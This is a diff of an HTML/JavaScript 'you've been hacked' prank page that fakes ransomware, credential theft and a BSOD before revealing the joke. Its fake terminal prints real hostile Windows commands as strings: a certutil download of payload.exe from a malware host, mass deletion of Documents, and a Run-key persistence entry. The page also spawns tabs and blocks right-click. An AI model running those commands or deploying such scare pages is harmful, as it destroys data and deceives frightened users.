@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SYSTEM OVERRIDE v1.0</title>
+    <title>SYSTEM COMPROMISED</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
-            background: black;
+            background: #000;
             overflow: hidden;
             font-family: 'Courier New', monospace;
+            height: 100vh;
         }
-        #glitchCanvas {
+        #matrixCanvas {
             position: fixed;
             top: 0;
             left: 0;
@@ -19,89 +19,94 @@
             height: 100%;
             z-index: 1;
         }
-        .overlay {
+        .terminal {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
             color: #0f0;
-            font-size: 24px;
-            text-align: center;
+            font-family: monospace;
+            font-size: 12px;
+            padding: 15px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            z-index: 3;
+            height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
             pointer-events: none;
         }
-        .codeOverlay {
+        .alertBox {
             position: fixed;
-            bottom: 10px;
-            left: 10px;
-            color: #0f0;
-            font-size: 12px;
-            z-index: 3;
-            background: rgba(0,0,0,0.7);
-            padding: 10px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            border: 3px solid #f00;
+            color: #f00;
+            padding: 30px;
+            text-align: center;
+            z-index: 10;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0 0 50px rgba(255,0,0,0.5);
+            display: none;
+        }
+        .countdown {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #000;
+            border: 2px solid #f00;
+            color: #f00;
+            padding: 15px 25px;
+            font-size: 28px;
+            font-weight: bold;
             font-family: monospace;
-            white-space: pre;
-            pointer-events: none;
+            z-index: 4;
+        }
+        .progressBar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            height: 5px;
+            background: #f00;
+            width: 0%;
+            z-index: 5;
+            transition: width 0.05s linear;
+        }
+        button {
+            position: fixed;
+            bottom: 240px;
+            left: 20px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 6;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <canvas id="glitchCanvas"></canvas>
-    <div class="overlay" id="mainOverlay">
-        <div>
-            <div id="mainText">⚠ SYSTEM BREACH DETECTED ⚠</div>
-            <div id="subText" style="font-size: 14px; margin-top: 20px;">Initializing...</div>
-        </div>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="terminal" id="terminal"></div>
+    <div class="countdown" id="countdown">00:60</div>
+    <div class="progressBar" id="progressBar"></div>
+    <div class="alertBox" id="alertBox">
+        ⚠ YOUR SYSTEM HAS BEEN HACKED ⚠<br>
+        <span style="font-size: 16px;">This is a prank. No damage done.</span><br>
+        <button id="closeBtn" style="display:inline-block; margin-top:20px; position:relative; bottom:auto; left:auto;">Exit Prank</button>
     </div>
-    <div class="codeOverlay" id="codeOverlay"></div>
 
     <script>
         (function() {
-            // Rickroll audio (hidden autoplay attempt)
-            const rickAudio = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
-            rickAudio.volume = 0.7;
-            rickAudio.loop = true;
-            
-            // Try to play on user interaction
-            document.body.addEventListener('click', () => {
-                rickAudio.play().catch(e => console.log);
-            });
-            document.body.addEventListener('touchstart', () => {
-                rickAudio.play().catch(e => console.log);
-            });
-            
-            // Force play attempt anyway
-            setTimeout(() => {
-                rickAudio.play().catch(e => {
-                    // Create fake play button
-                    const btn = document.createElement('button');
-                    btn.innerText = 'CLICK TO CONTINUE';
-                    btn.style.position = 'fixed';
-                    btn.style.top = '50%';
-                    btn.style.left = '50%';
-                    btn.style.transform = 'translate(-50%, -50%)';
-                    btn.style.zIndex = '9999';
-                    btn.style.padding = '20px';
-                    btn.style.fontSize = '24px';
-                    btn.style.background = '#f00';
-                    btn.style.color = '#fff';
-                    btn.style.border = 'none';
-                    btn.style.cursor = 'pointer';
-                    btn.onclick = () => {
-                        rickAudio.play();
-                        btn.remove();
-                    };
-                    document.body.appendChild(btn);
-                });
-            }, 500);
-            
-            // Glitch canvas effect
-            const canvas = document.getElementById('glitchCanvas');
+            // Matrix rain effect
+            const canvas = document.getElementById('matrixCanvas');
             const ctx = canvas.getContext('2d');
             
             function resizeCanvas() {
@@ -111,284 +116,290 @@
             window.addEventListener('resize', resizeCanvas);
             resizeCanvas();
             
-            let glitchInterval;
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}[]|;:,.<>?";
+            const fontSize = 16;
+            let columns = Math.floor(canvas.width / fontSize);
+            let drops = new Array(columns).fill(1);
             
-            function startGlitch() {
-                let frame = 0;
-                glitchInterval = setInterval(() => {
-                    if (!canvas) return;
-                    ctx.fillStyle = '#000';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    // Random glitch rectangles
-                    for (let i = 0; i < 30; i++) {
-                        const x = Math.random() * canvas.width;
-                        const y = Math.random() * canvas.height;
-                        const w = 50 + Math.random() * 200;
-                        const h = 5 + Math.random() * 30;
-                        const r = Math.floor(Math.random() * 255);
-                        const g = Math.floor(Math.random() * 255);
-                        const b = Math.floor(Math.random() * 255);
-                        ctx.fillStyle = `rgba(${r}, ${g}, ${b}, 0.7)`;
-                        ctx.fillRect(x, y, w, h);
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#0f0';
+                ctx.font = fontSize + 'px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
                     }
-                    
-                    // Scanlines
-                    for (let i = 0; i < canvas.height; i += 8) {
-                        ctx.fillStyle = `rgba(0, 255, 0, ${Math.random() * 0.3})`;
-                        ctx.fillRect(0, i, canvas.width, 2);
-                    }
-                    
-                    frame++;
-                }, 50);
+                    drops[i]++;
+                }
+            }
+            setInterval(drawMatrix, 50);
+            
+            // Terminal logging
+            const terminal = document.getElementById('terminal');
+            function log(msg) {
+                const line = document.createElement('div');
+                line.textContent = '> ' + msg;
+                terminal.appendChild(line);
+                terminal.scrollTop = terminal.scrollHeight;
             }
             
-            startGlitch();
-            
-            // Scrolling code text
-            const codeLines = [
-                "> ACCESSING SYSTEM FILES...",
-                "> BYPASSING FIREWALL...",
-                "> DECRYPTING USER DATA...",
-                "> SESSION HIJACK IN PROGRESS...",
-                "> [ERROR] UNKNOWN PROTOCOL...",
-                "> FORCING ADMIN ACCESS...",
-                "> C:\\WINDOWS\\SYSTEM32\\HACK.exe LOADED",
-                "> 0x7F3A2B1C: MEMORY DUMP INITIATED",
-                "> TRACING IP: 192.168.1." + Math.floor(Math.random() * 255),
-                "> YOUR DEVICE IS COMPROMISED",
-                "> DOWNLOADING MALWARE PACKAGE...",
-                "> [WARNING] RANSOMWARE DEPLOYED",
-                "> ALL FILES ENCRYPTED",
-                "> SENDING CREDENTIALS TO SERVER...",
-                "> KEYLOGGER ACTIVE",
-                "> WEBCAM ACCESS GRANTED",
-                "> MICROPHONE RECORDING STARTED",
-                "> LOCATION TRACKING ENABLED",
-                "> DO NOT TURN OFF YOUR COMPUTER",
-                "> PAY $500 IN BITCOIN TO DECRYPT"
-            ];
-            
-            let codeIndex = 0;
-            const codeOverlay = document.getElementById('codeOverlay');
-            const mainText = document.getElementById('mainText');
-            const subText = document.getElementById('subText');
-            
-            const textMessages = [
-                "⚠ SYSTEM BREACH DETECTED ⚠",
-                "🔒 YOUR PC IS LOCKED 🔒",
-                "💀 YOU HAVE BEEN HACKED 💀",
-                "📸 WEBCAM ACCESS GRANTED 📸",
-                "🎙️ MICROPHONE ACTIVE 🎙️",
-                "📍 YOUR IP IS LOGGED 📍",
-                "💰 SEND $500 BITCOIN TO UNLOCK 💰",
-                "⌛ 60 SECONDS REMAINING ⌛",
-                "⛔ DATA DELETION IN PROGRESS ⛔",
-                "☠️ SAY GOODBYE TO YOUR FILES ☠️"
+            // Hacking messages sequence
+            const messages = [
+                "Initializing kernel exploit...",
+                "Bypassing UAC protection...",
+                "Accessing system32 directory...",
+                "Extracting saved credentials...",
+                "Dumping browser passwords...",
+                "Copying clipboard history...",
+                "Enumerating network devices...",
+                "Installing remote access trojan...",
+                "Disabling firewall...",
+                "Injecting malicious code into explorer.exe",
+                "Activating keylogger...",
+                "Webcam access granted",
+                "Microphone recording started",
+                "Encrypting personal files (AES-256)",
+                "Downloading ransomware payload...",
+                "Sensitive data exfiltration in progress...",
+                "Your IP has been logged: " + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255),
+                "Establishing persistent backdoor...",
+                "System restore points deleted",
+                "MBR overwrite scheduled",
+                "ALL YOUR FILES ARE BEING ENCRYPTED"
             ];
             
             let msgIndex = 0;
-            const textInterval = setInterval(() => {
-                mainText.style.opacity = '0';
-                setTimeout(() => {
-                    mainText.innerText = textMessages[msgIndex % textMessages.length];
-                    mainText.style.opacity = '1';
+            const msgInterval = setInterval(() => {
+                if (msgIndex < messages.length) {
+                    log(messages[msgIndex]);
                     msgIndex++;
-                }, 200);
-            }, 2000);
-            
-            const codeInterval = setInterval(() => {
-                const line = codeLines[codeIndex % codeLines.length];
-                codeOverlay.innerHTML += line + '\n';
-                codeOverlay.scrollTop = codeOverlay.scrollHeight;
-                codeIndex++;
-                if (codeOverlay.innerHTML.split('\n').length > 25) {
-                    const lines = codeOverlay.innerHTML.split('\n');
-                    lines.shift();
-                    codeOverlay.innerHTML = lines.join('\n');
-                }
-            }, 300);
-            
-            let subMessages = [
-                "Accessing kernel memory...",
-                "Bypassing UAC...",
-                "Extracting saved passwords...",
-                "Dumping browser history...",
-                "Copying clipboard contents...",
-                "Enumerating network devices...",
-                "Infecting MBR...",
-                "Installing rootkit..."
-            ];
-            let subIdx = 0;
-            const subInterval = setInterval(() => {
-                subText.innerText = subMessages[subIdx % subMessages.length];
-                subIdx++;
-            }, 1200);
-            
-            // OPEN MULTIPLE TABS (popup blocker may prevent some)
-            function openTabs() {
-                const urls = [
-                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
-                ];
-                for (let i = 0; i < 5; i++) {
-                    setTimeout(() => {
-                        window.open(urls[i % urls.length], '_blank');
-                    }, i * 800);
-                }
-            }
-            
-            // SCREEN FLICKER
-            let flickerInterval = setInterval(() => {
-                const overlay = document.getElementById('mainOverlay');
-                if (Math.random() > 0.7) {
-                    overlay.style.opacity = '0.3';
-                    setTimeout(() => { overlay.style.opacity = '1'; }, 50);
-                }
-                if (Math.random() > 0.9) {
-                    document.body.style.backgroundColor = '#0f0';
-                    setTimeout(() => { document.body.style.backgroundColor = 'black'; }, 100);
-                }
-            }, 200);
-            
-            // BEEP SOUNDS (using Web Audio API for fake hacking sounds)
-            function beep(freq, duration) {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.frequency.value = freq;
-                gainNode.gain.value = 0.1;
-                oscillator.start();
-                setTimeout(() => {
-                    oscillator.stop();
-                    audioCtx.close();
-                }, duration);
-            }
-            
-            const beepInterval = setInterval(() => {
-                if (Math.random() > 0.6) {
-                    beep(800 + Math.random() * 500, 100);
+                } else {
+                    clearInterval(msgInterval);
                 }
             }, 800);
             
-            // Fake progress bar that fills then resets
-            const fakeProgress = document.createElement('div');
-            fakeProgress.style.position = 'fixed';
-            fakeProgress.style.bottom = '0';
-            fakeProgress.style.left = '0';
-            fakeProgress.style.width = '0%';
-            fakeProgress.style.height = '5px';
-            fakeProgress.style.backgroundColor = '#f00';
-            fakeProgress.style.zIndex = '9999';
-            fakeProgress.style.transition = 'width 0.1s linear';
-            document.body.appendChild(fakeProgress);
-            
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += Math.random() * 15;
-                if (progress > 100) progress = 0;
-                fakeProgress.style.width = progress + '%';
-                if (progress > 70) fakeProgress.style.backgroundColor = '#ff0';
-                if (progress > 90) fakeProgress.style.backgroundColor = '#0f0';
-            }, 200);
-            
             // Countdown timer
-            let secondsLeft = 60;
-            const timerDiv = document.createElement('div');
-            timerDiv.style.position = 'fixed';
-            timerDiv.style.top = '20px';
-            timerDiv.style.right = '20px';
-            timerDiv.style.color = '#f00';
-            timerDiv.style.fontSize = '32px';
-            timerDiv.style.fontFamily = 'monospace';
-            timerDiv.style.fontWeight = 'bold';
-            timerDiv.style.zIndex = '9999';
-            timerDiv.style.background = 'black';
-            timerDiv.style.padding = '10px';
-            timerDiv.style.border = '2px solid red';
-            timerDiv.innerText = '00:' + secondsLeft;
-            document.body.appendChild(timerDiv);
-            
-            const countdown = setInterval(() => {
-                secondsLeft--;
-                if (secondsLeft < 0) {
-                    clearInterval(countdown);
-                    timerDiv.innerText = '00:00 - DELETING FILES';
-                    timerDiv.style.color = '#fff';
-                    timerDiv.style.background = '#f00';
-                    
-                    // Final scare - full screen fake BSOD
-                    document.body.innerHTML = '';
-                    const bsod = document.createElement('div');
-                    bsod.style.position = 'fixed';
-                    bsod.style.top = '0';
-                    bsod.style.left = '0';
-                    bsod.style.width = '100%';
-                    bsod.style.height = '100%';
-                    bsod.style.backgroundColor = '#0000aa';
-                    bsod.style.color = '#fff';
-                    bsod.style.fontFamily = 'monospace';
-                    bsod.style.fontSize = '24px';
-                    bsod.style.padding = '50px';
-                    bsod.style.zIndex = '99999';
-                    bsod.innerHTML = `
-                        <div style="margin-top: 100px;">
-                            <h1>:(</h1>
-                            <p>Your PC ran into a problem and needs to restart.</p>
-                            <p>Error: CRITICAL_PROCESS_DIED</p>
-                            <p>What failed: svchost.exe_System32</p>
-                            <p>We're collecting error info: 100% complete</p>
-                            <p>If you call support, give them this code: ${Math.floor(Math.random() * 999999)}</p>
-                            <br><br>
-                            <p style="font-size: 16px;">Just kidding! You've been pranked 😂</p>
-                            <button id="rickFinal" style="padding: 10px; font-size: 18px; margin-top: 30px;">Click for Rickroll</button>
-                        </div>
-                    `;
-                    document.body.appendChild(bsod);
-                    document.getElementById('rickFinal').onclick = () => {
-                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-                    };
-                } else {
-                    const mins = Math.floor(secondsLeft / 60);
-                    const secs = secondsLeft % 60;
-                    timerDiv.innerText = `0${mins}:${secs < 10 ? '0' + secs : secs}`;
-                    if (secondsLeft < 10) timerDiv.style.color = '#ff0';
-                    if (secondsLeft < 5) timerDiv.style.color = '#0f0';
+            let seconds = 60;
+            const countdownEl = document.getElementById('countdown');
+            const progressBar = document.getElementById('progressBar');
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                countdownEl.textContent = `0${mins}:${secs < 10 ? '0' + secs : secs}`;
+                const progressPercent = ((60 - seconds) / 60) * 100;
+                progressBar.style.width = progressPercent + '%';
+                
+                if (seconds <= 10) {
+                    countdownEl.style.color = '#ff0';
+                    progressBar.style.background = '#ff0';
+                }
+                if (seconds <= 5) {
+                    countdownEl.style.color = '#0f0';
+                    progressBar.style.background = '#0f0';
+                }
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    clearInterval(msgInterval);
+                    clearInterval(tabInterval);
+                    clearInterval(randomGlow);
+                    document.getElementById('alertBox').style.display = 'block';
+                    countdownEl.style.display = 'none';
+                    progressBar.style.display = 'none';
+                    // Stop matrix effect
+                    clearInterval(window.matrixInterval);
                 }
             }, 1000);
             
-            // Open tabs after 3 seconds
+            // TAB MANAGEMENT - open and close tabs repeatedly
+            let openedTabs = [];
+            
+            function openRandomTab() {
+                const urls = [
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                    'https://www.nytimes.com/games/wordle/index.html',
+                    'https://www.google.com'
+                ];
+                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+                const newTab = window.open(randomUrl, '_blank');
+                if (newTab) {
+                    openedTabs.push(newTab);
+                    log("Spawned malicious window: " + randomUrl);
+                } else {
+                    log("Popup blocked! Please allow popups for full prank effect.");
+                }
+            }
+            
+            function closeRandomTab() {
+                if (openedTabs.length > 0) {
+                    const tab = openedTabs.pop();
+                    try {
+                        tab.close();
+                        log("Terminated remote process window");
+                    } catch(e) {
+                        log("Failed to close window (cross-origin restriction)");
+                    }
+                }
+            }
+            
+            // Open/close tabs on intervals
+            const tabInterval = setInterval(() => {
+                if (seconds > 0) {
+                    if (Math.random() > 0.5 && openedTabs.length < 8) {
+                        openRandomTab();
+                    } else if (openedTabs.length > 2) {
+                        closeRandomTab();
+                    }
+                }
+            }, 2500);
+            
+            // Additional close spree at 10 seconds
             setTimeout(() => {
-                openTabs();
-            }, 3000);
+                const closeSpree = setInterval(() => {
+                    if (seconds <= 10 && seconds > 0) {
+                        closeRandomTab();
+                    } else if (seconds <= 0) {
+                        clearInterval(closeSpree);
+                    }
+                }, 500);
+            }, 45000);
+            
+            // Screen glitch effects
+            let glitchActive = true;
+            function randomGlitch() {
+                if (!glitchActive) return;
+                const glitchChance = Math.random();
+                if (glitchChance > 0.85) {
+                    document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+                    setTimeout(() => { document.body.style.transform = ''; }, 100);
+                }
+                if (glitchChance > 0.9) {
+                    document.body.style.filter = 'invert(1)';
+                    setTimeout(() => { document.body.style.filter = ''; }, 200);
+                }
+                if (glitchChance > 0.95) {
+                    const originalColor = document.body.style.backgroundColor;
+                    document.body.style.backgroundColor = '#f00';
+                    setTimeout(() => { document.body.style.backgroundColor = originalColor; }, 150);
+                }
+            }
+            const randomGlow = setInterval(randomGlitch, 300);
+            
+            // Fake typing effect on terminal (simulates automated hacking)
+            function typeFakeCommand() {
+                const commands = [
+                    "C:\\> hack --exploit CVE-2024-4358",
+                    "C:\\> net user Administrator *",
+                    "C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "C:\\> certutil -urlcache -f http://malware.com/payload.exe payload.exe",
+                    "C:\\> start payload.exe",
+                    "C:\\> del /F /Q C:\\Users\\*\\Documents\\*",
+                    "C:\\> shutdown /s /t 30 /c \"SYSTEM COMPROMISED\""
+                ];
+                if (Math.random() > 0.7) {
+                    const cmd = commands[Math.floor(Math.random() * commands.length)];
+                    log(cmd);
+                }
+            }
+            const typeInterval = setInterval(typeFakeCommand, 2000);
+            
+            // Browser DOM manipulation - move elements randomly
+            function moveElementsRandomly() {
+                const elements = document.querySelectorAll('.terminal, .countdown, .progressBar');
+                elements.forEach(el => {
+                    if (Math.random() > 0.95 && el.style.position !== 'fixed') {
+                        el.style.position = 'relative';
+                        el.style.left = Math.random() * 50 + 'px';
+                        el.style.top = Math.random() * 50 + 'px';
+                        setTimeout(() => {
+                            el.style.left = '';
+                            el.style.top = '';
+                        }, 300);
+                    }
+                });
+            }
+            setInterval(moveElementsRandomly, 800);
             
             // Fake fullscreen request
             setTimeout(() => {
-                const elem = document.documentElement;
-                if (elem.requestFullscreen) {
-                    elem.requestFullscreen().catch(e => console.log);
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(e => log("Fullscreen blocked by browser"));
                 }
-            }, 1500);
+            }, 2000);
             
-            // Disable right click
-            document.addEventListener('contextmenu', (e) => {
-                e.preventDefault();
-                return false;
+            // Fake mouse trail (spooky)
+            const trailDiv = document.createElement('div');
+            trailDiv.style.position = 'fixed';
+            trailDiv.style.pointerEvents = 'none';
+            trailDiv.style.zIndex = '9999';
+            document.body.appendChild(trailDiv);
+            
+            document.addEventListener('mousemove', (e) => {
+                if (Math.random() > 0.95) {
+                    const trail = document.createElement('div');
+                    trail.textContent = '⚠';
+                    trail.style.position = 'fixed';
+                    trail.style.left = e.clientX + 'px';
+                    trail.style.top = e.clientY + 'px';
+                    trail.style.color = '#0f0';
+                    trail.style.fontSize = '16px';
+                    trail.style.fontFamily = 'monospace';
+                    trail.style.pointerEvents = 'none';
+                    trail.style.zIndex = '9999';
+                    document.body.appendChild(trail);
+                    setTimeout(() => trail.remove(), 500);
+                }
             });
             
-            // Fake cursor change
-            setInterval(() => {
-                if (Math.random() > 0.8) {
-                    document.body.style.cursor = 'wait';
-                    setTimeout(() => { document.body.style.cursor = 'default'; }, 500);
+            // Disable right click
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            // Close button handler
+            document.getElementById('closeBtn').onclick = () => {
+                // Close all opened tabs
+                for (let tab of openedTabs) {
+                    try { tab.close(); } catch(e) {}
                 }
+                // Redirect to Rickroll
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            };
+            
+            // Web Audio API - scary beeps
+            function playBeep(freq, duration) {
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    oscillator.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    oscillator.frequency.value = freq;
+                    gain.gain.value = 0.15;
+                    oscillator.start();
+                    setTimeout(() => {
+                        oscillator.stop();
+                        audioCtx.close();
+                    }, duration);
+                } catch(e) {}
+            }
+            
+            const beepInterval = setInterval(() => {
+                if (seconds > 0 && Math.random() > 0.7) {
+                    playBeep(800 + Math.random() * 400, 80);
+                }
+                if (seconds <= 0) clearInterval(beepInterval);
             }, 1000);
             
-            console.log('%c⚠ YOU HAVE BEEN PRANKED ⚠', 'color: red; font-size: 24px;');
-            console.log('%cNothing was actually hacked. This is a joke.', 'color: green; font-size: 16px;');
+            // Console scare message
+            console.log("%c⚠ SYSTEM HACKED ⚠", "color: #f00; font-size: 30px; font-weight: bold;");
+            console.log("%cThis is a harmless prank. No actual damage.", "color: #0f0; font-size: 16px;");
+            
+            log("Remote access established. Have fun ;)");
         })();
     </script>
 </body>
